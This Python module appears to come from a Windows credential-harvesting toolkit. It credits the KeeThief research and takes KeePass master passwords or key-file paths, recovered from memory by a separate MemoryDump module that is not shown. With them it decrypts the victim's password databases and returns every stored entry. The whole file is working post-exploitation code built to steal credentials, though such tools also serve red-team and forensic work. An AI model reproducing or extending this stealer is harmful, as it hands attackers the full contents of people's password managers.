# -*- coding: utf-8 -*-
# Thanks to the awesome work done by harmjoy
# For more information http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/

# Thanks for the great work of libkeepass (used to decrypt keepass file)
# https://github.com/phpwutz/libkeepass

import traceback

from .memorydump import MemoryDump
import libkeepass
from winsecs.utils import log


class Keepass:
    def run(self):
        res = []
        # password found on the memory dump class
        k = MemoryDump().run(justfind=True) or {}
        for db in k:
            try:
                with libkeepass.open(
                    db.values()[0]['Database'],
                    password=db.get("KcpPassword", {}).get('Password'),
                    keyfile=db.get("KcpKeyFile", {}).get('KeyFilePath')
                ) as kdb:
                    res.extend(kdb.to_dic())
            except Exception:
                log.debug(traceback.format_exc())
        return res


modules = {"Keepass": Keepass()}
